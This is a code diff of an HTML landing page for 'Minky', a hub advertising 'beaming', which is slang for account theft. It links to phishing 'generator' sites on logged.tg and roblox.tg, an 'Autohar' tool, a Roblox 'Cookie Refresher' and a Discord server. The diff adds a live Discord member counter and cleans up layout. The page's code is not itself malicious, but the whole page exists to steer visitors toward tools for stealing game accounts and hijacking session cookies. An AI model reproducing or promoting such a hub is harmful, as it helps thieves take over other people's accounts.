@@ -265,7 +265,6 @@
       from { opacity: 0; transform: translateY(20px); }
       to { opacity: 1; transform: translateY(0); }
     }
-
     /* === SNOWFLAKES === */
     .snowflake {
       position: fixed;
@@ -280,7 +279,6 @@
       font-size: 1.2rem;
       line-height: 1;
     }
-
     @keyframes fall {
       0% {
         transform: translateY(-10%) rotate(0deg);
@@ -294,16 +292,45 @@
         opacity: 0;
       }
     }
+
+    /* === DISCORD MEMBER COUNTER === */
+    .discord-counter {
+      position: fixed;
+      top: 20px;
+      left: 20px;
+      color: white;
+      font-family: 'Orbitron', sans-serif;
+      font-size: 0.9rem;
+      text-align: center;
+      z-index: 100;
+      background: rgba(0, 0, 0, 0.4);
+      padding: 10px;
+      border-radius: 10px;
+      border: 1px solid #333;
+      box-shadow: 0 0 10px rgba(255, 255, 255, 0.1);
+      min-width: 160px;
+    }
+    .member-count {
+      font-size: 1.4rem;
+      font-weight: 600;
+      margin-top: 4px;
+      letter-spacing: 1px;
+    }
   </style>
 </head>
 <body>
+<!-- Live Discord Member Counter -->
+<div class="discord-counter">
+  <div>Server Current Members:</div>
+  <div class="member-count" id="memberCount">—</div>
+</div>
+
 <!-- Snowflakes will be injected by JS -->
 <div class="report-ui-overlay" onclick="closeReportUI()"></div>
 <div class="container">
   <h1>Minky</h1>
   <p>Best Beaming Sites/Methods/Tools/Tutorials 👾<br>Join Our Discord For The Full Beaming Experience 👾</p>
   <div class="link-list">
-
     <!-- Main Generator Site - Moon Icon -->
     <a href="https://www.logged.tg/auth/minkybeams" target="_blank">
       <svg class="icon" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
@@ -311,7 +338,6 @@
       </svg>
       Main Generator Site
     </a>
-
     <!-- Immortal (Generator 2) - Plus Icon -->
     <a href="https://roblox.tg/dashboard" target="_blank">
       <svg class="icon" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
@@ -320,7 +346,6 @@
       </svg>
       Immortal (Generator 2)
     </a>
-
     <!-- Autohar - Lightning Icon -->
     <a href="https://is.gd/bhAW9Q" target="_blank">
       <svg class="icon" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
@@ -328,35 +353,29 @@
       </svg>
       Autohar
     </a>
-
-    <!-- Cookie Refresher - Custom Refresh Icon -->
+    <!-- Cookie Refresher - Fixed Refresh Icon -->
     <a href="https://dropref.com/?https://www.logged.tg/tools/refresher" target="_blank">
-  <svg class="icon" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
-    <path d="M3 12a9 9 0 1 0 9-9 9.75 9.75 0 0 1 6.7 2.7l2.6-2.6"></path>
-    <path d="M21 12c0 4.97-4.03 9-9 9-3.3 0-6.18-1.8-7.68-4.5"></path>
-    <path d="M3 12l3-3m0 0 3-3M6 9h12"></path>
-  </svg>
-  Cookie Refresher
-</a>
-
+      <svg class="icon" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+        <path d="M23 4v6h-6"></path>
+        <path d="M20.49 15a9 9 0 1 1-2.12-9.36L23 10"></path>
+      </svg>
+      Cookie Refresher
+    </a>
     <!-- Discord Server -->
     <a href="https://discord.gg/kPeNP5aJTK" target="_blank" class="discord-special">
       <img src="https://cdn-icons-png.flaticon.com/512/5968/5968756.png" alt="Discord" class="discord-icon">
       Discord Server
     </a>
-
   </div>
   <div style="font-size: 0.8rem; color: #aaa; margin-top: 10px;">
     If The Sites Are Down Or Flagged Be Patient As We Are Aware Of This And Working On Fixing It ASAP
   </div>
   <footer>© 2025 Minky</footer>
 </div>
-
 <!-- Report Button -->
 <div class="report-button" onclick="toggleReport()">
   🛠<div class="report-label">Report</div>
 </div>
-
 <!-- Report UI -->
 <div class="report-ui" id="reportUI">
   <h2>Report A Bug/Suggestions</h2>
@@ -380,10 +399,8 @@
   <div id="photoPreviewContainer" class="photo-preview"></div>
   <button class="submit-btn" onclick="submitReport()">Submit Report</button>
 </div>
-
 <div class="confirmation" id="confirmationMsg">Report sent successfully</div>
 <div class="error-msg" id="errorMsg">Error</div>
-
 <script>
   const reportUI = document.getElementById("reportUI");
   const overlay = document.querySelector(".report-ui-overlay");
@@ -392,7 +409,6 @@
   const photoInput = document.getElementById("addPhoto");
   const photoContainer = document.getElementById("photoPreviewContainer");
   let photoFiles = [];
-
   function toggleReport() {
     const isActive = reportUI.classList.contains("active");
     if (isActive) {
@@ -402,27 +418,22 @@
       overlay.style.display = "block";
     }
   }
-
   function closeReportUI() {
     reportUI.classList.remove("active");
     overlay.style.display = "none";
   }
-
   function showError(msg) {
     const error = document.getElementById("errorMsg");
     error.textContent = msg;
     error.classList.add("active");
     setTimeout(() => error.classList.remove("active"), 4000);
   }
-
   function updateCharCount() {
     const len = textArea.value.length;
     charCount.textContent = `${len} / 3000`;
     charCount.classList.toggle("limit", len >= 3000);
   }
-
   textArea.addEventListener("input", updateCharCount);
-
   photoInput.addEventListener("change", () => {
     const files = Array.from(photoInput.files);
     if (photoFiles.length + files.length > 5) {
@@ -452,7 +463,6 @@
     });
     photoInput.value = '';
   });
-
   async function submitReport() {
     const user = document.getElementById("discordUser").value.trim();
     const id = document.getElementById("discordID").value.trim();
@@ -492,34 +502,48 @@ ${text}`,
       }, 5000);
     });
   }
-
   // === INFINITE SNOWFLAKES ===
   function createSnowflake() {
     const flake = document.createElement('div');
     flake.classList.add('snowflake');
     flake.textContent = '❄';
-
     flake.style.left = `${Math.random() * 100}vw`;
     const size = 0.8 + Math.random() * 1;
     flake.style.fontSize = `${size}rem`;
     const duration = 10 + Math.random() * 10;
     flake.style.animationDuration = `${duration}s`;
-
     document.body.appendChild(flake);
-
     setTimeout(() => {
       flake.remove();
     }, duration * 1000);
   }
-
   function startSnow(interval = 700) {
     createSnowflake();
     setInterval(createSnowflake, interval);
   }
-
   window.addEventListener('load', () => {
     startSnow(700);
   });
+
+  // === LIVE DISCORD MEMBER COUNTER ===
+  async function updateMemberCount() {
+    try {
+      const response = await fetch('https://discord.com/api/v10/invites/kPeNP5aJTK?with_counts=true');
+      const data = await response.json();
+      if (data.approximate_member_count) {
+        document.getElementById('memberCount').textContent = new Intl.NumberFormat().format(data.approximate_member_count);
+      } else {
+        document.getElementById('memberCount').textContent = '—';
+      }
+    } catch (err) {
+      console.error('Failed to fetch Discord member count:', err);
+      document.getElementById('memberCount').textContent = '—';
+    }
+  }
+  // Load on page load
+  updateMemberCount();
+  // Update every 2 minutes
+  setInterval(updateMemberCount, 120000);
 </script>
 </body>
 </html>
